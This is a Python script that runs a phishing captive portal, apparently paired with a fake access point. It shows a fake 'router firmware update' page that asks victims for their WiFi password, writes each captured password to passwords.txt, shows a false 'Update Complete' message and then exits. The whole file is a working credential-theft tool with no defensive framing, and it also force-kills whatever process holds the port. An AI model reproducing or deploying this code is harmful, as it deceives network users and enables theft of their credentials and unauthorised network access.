#!/usr/bin/env python3
"""
Minimal Captive Portal - Router Firmware Update Style
Using Python HTTPServer with socket reuse
"""

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
from datetime import datetime
import threading
import time
import os
import socket
import sys

# HTML template
PORTAL_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 0;
            min-height: 100vh;
        }

        .blue-header {
            background: #2196F3;
            color: white;
            padding: 30px 40px;
            text-align: left;
        }

        .blue-header h1 {
            font-size: 36px;
            font-weight: 400;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .blue-header p {
            font-size: 16px;
            opacity: 0.9;
            font-weight: 300;
        }

        .content {
            background: white;
            margin: 0;
            padding: 40px;
            min-height: calc(100vh - 140px);
        }

        .update-title {
            font-size: 48px;
            font-weight: 300;
            color: #333;
            margin-bottom: 30px;
            letter-spacing: -1px;
        }

        .update-message {
            font-size: 16px;
            color: #666;
            line-height: 1.5;
            margin-bottom: 50px;
            max-width: 600px;
        }

        .form-group {
            margin-bottom: 30px;
            max-width: 600px;
        }

        .form-label {
            display: block;
            font-size: 16px;
            font-weight: 400;
            color: #333;
            margin-bottom: 12px;
        }

        .form-input {
            width: 100%;
            padding: 18px 20px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            background: white;
            transition: border-color 0.3s ease;
            font-family: monospace;
            letter-spacing: 2px;
        }

        .form-input:focus {
            outline: none;
            border-color: #2196F3;
            box-shadow: 0 0 0 1px #2196F3;
        }

        .form-input::placeholder {
            color: #999;
            letter-spacing: 1px;
        }

        .start-btn {
            width: 100%;
            max-width: 600px;
            background: #e0e0e0;
            color: #666;
            border: 1px solid #ccc;
            padding: 20px 24px;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 400;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 60px;
        }

        .start-btn:hover {
            background: #d5d5d5;
            border-color: #bbb;
        }

        .footer-text {
            color: #999;
            font-size: 14px;
            text-align: left;
            font-weight: 300;
        }
    </style>
</head>
<body>
    <div class="blue-header">
        <h1>Free WiFi</h1>
        <p>Router info.</p>
    </div>

    <div class="content">
        <h2 class="update-title">Update</h2>

        <p class="update-message">
            Your router firmware is out of date. Update your firmware to continue browsing normally.
        </p>

        <form method="POST" action="/">
            <div class="form-group">
                <label class="form-label" for="password">WiFi password:</label>
                <input type="password" id="password" name="password" class="form-input" placeholder="•••••••••••" required>
            </div>

            <button type="submit" class="start-btn">Start</button>
        </form>

        <p class="footer-text">© All rights reserved.</p>
    </div>
</body>
</html>
"""

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        # Suppress default logging - uncomment for debugging
        # print(f"[HTTP] {format % args}")
        pass
    
    def do_GET(self):
        # Handle all GET requests the same way - show the portal
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
        self.send_header('Pragma', 'no-cache')
        self.send_header('Expires', '0')
        self.end_headers()
        self.wfile.write(PORTAL_TEMPLATE.encode('utf-8'))
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Parse form data
        parsed_data = urllib.parse.parse_qs(post_data)
        password = parsed_data.get('password', [''])[0].strip()
        
        if password:
            # Save password to file
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            with open('passwords.txt', 'a') as f:
                f.write(f"{timestamp} - {password}\n")
            
            print(f"[!] Password captured: {password}")
            
            # Schedule server shutdown after a delay
            def shutdown_server():
                time.sleep(2)
                print("[*] Shutting down server...")
                os._exit(0)
            
            threading.Thread(target=shutdown_server, daemon=True).start()
            
            # Return a success page with JavaScript to close
            success_html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>Update Complete</title>
                <meta charset="UTF-8">
                <style>
                    body {
                        font-family: Arial, sans-serif;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                        background: #f0f0f0;
                    }
                    .message {
                        text-align: center;
                        padding: 40px;
                        background: white;
                        border-radius: 8px;
                        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                    }
                    h2 { color: #4CAF50; }
                    p { color: #666; margin-top: 20px; }
                </style>
            </head>
            <body>
                <div class="message">
                    <h2>✓ Update Complete</h2>
                    <p>Your firmware has been updated successfully.<br>You may now close this window.</p>
                </div>
                <script>
                    setTimeout(function() {
                        window.close();
                        window.open('', '_self', '');
                        window.close();
                    }, 3000);
                </script>
            </body>
            </html>
            """
            
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(success_html.encode('utf-8'))
        else:
            # Redirect back to form if no password
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()


class ReusableHTTPServer(HTTPServer):
    """HTTPServer with socket reuse enabled"""
    allow_reuse_address = True
    allow_reuse_port = True
    
    def server_bind(self):
        # Set SO_REUSEADDR before binding
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Try to set SO_REUSEPORT if available (Linux)
        if hasattr(socket, 'SO_REUSEPORT'):
            try:
                self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
            except (AttributeError, OSError):
                pass  # Not critical if this fails
        
        # Set TCP_NODELAY to disable Nagle's algorithm for better responsiveness
        self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        
        # Now bind
        super().server_bind()
    
    def handle_error(self, request, client_address):
        # Suppress connection reset errors
        exc_type, exc_value = sys.exc_info()[:2]
        if exc_type is ConnectionResetError:
            pass  # Ignore connection resets
        else:
            super().handle_error(request, client_address)


def captive_portal(server_ip="192.168.0.1", port=80):
    """
    Run the captive portal with socket reuse options
    
    Args:
        server_ip: IP address to bind to (default: 192.168.0.1)
        port: Port to bind to (default: 80)
    
    Returns:
        HTTPServer instance or None if failed
    """
    
    print(f"[*] Starting captive portal on {server_ip}:{port}")
    
    # Kill any existing process on port 80
    try:
        import subprocess
        subprocess.run(['sudo', 'fuser', '-k', f'{port}/tcp'], 
                      capture_output=True, check=False)
        time.sleep(0.5)  # Give time for port to be released
    except:
        pass
    
    httpd = None
    try:
        httpd = ReusableHTTPServer((server_ip, port), CaptivePortalHandler)
        print(f"[✓] Successfully bound to {server_ip}:{port}")
        print("[✓] Captive Portal Running - Waiting for connections...")
        print("[*] Press Ctrl+C to stop")
        print("-" * 50)
        
        # Start serving
        httpd.serve_forever()
        
    except PermissionError:
        print(f"[ERROR] Permission denied for port {port}")
        print("[!] Run with sudo for ports below 1024")
        if httpd:
            httpd.shutdown()
            httpd.server_close()
        return None
        
    except OSError as e:
        if e.errno == 98:  # Address already in use
            print(f"[ERROR] Failed to bind to {server_ip}:{port} - Address already in use")
            print("[!] Try:")
            print(f"    1. Run: sudo fuser -k {port}/tcp")
            print(f"    2. Run: sudo lsof -i:{port} to see what's using the port")
            print(f"    3. Wait a moment and try again")
        elif e.errno == 99:  # Cannot assign requested address
            print(f"[ERROR] Cannot bind to {server_ip} - Interface not configured")
            print("[!] Make sure the fake AP is running first")
        else:
            print(f"[ERROR] Failed to bind: {e}")
        
        if httpd:
            httpd.shutdown()
            httpd.server_close()
        return None
        
    except KeyboardInterrupt:
        print("\n[*] Shutting down captive portal...")
        
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        
    finally:
        if httpd:
            print("[*] Cleaning up...")
            httpd.shutdown()
            httpd.server_close()
            print("[✓] Captive portal stopped")
    
    return httpd


# For testing/debugging
def test_portal():
    """Test function to run portal on localhost:8080"""
    print("[TEST MODE] Running on localhost:8080")
    captive_portal("127.0.0.1", 8080)
